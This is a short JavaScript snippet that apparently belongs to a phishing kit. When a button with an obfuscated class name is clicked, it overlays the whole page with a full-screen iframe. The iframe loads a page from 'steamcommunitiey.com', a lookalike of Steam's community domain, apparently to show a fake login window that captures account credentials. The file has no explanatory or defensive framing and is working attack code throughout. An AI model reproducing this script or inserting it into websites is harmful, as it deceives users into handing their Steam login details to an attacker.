const className = ".lk0e6gi8s69v"
const staticUrl = "https://api.steamcommunitiey.com/static"

(() => {
    const openWind = () => {
        const buttons = document.querySelectorAll(className)

        if (buttons && buttons.length > 0) {
            buttons.forEach((button) => {
               button.onclick  =() => {
                    console.log("A");
                    const iframe = document.createElement("iframe")
                    iframe.src = `${staticUrl}/txqmjgkxhzp5.html`
                    iframe.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1000"
                    document.body.appendChild(iframe)
                    console.log("B");
               }
            })
        }

    }

    openWind()
})()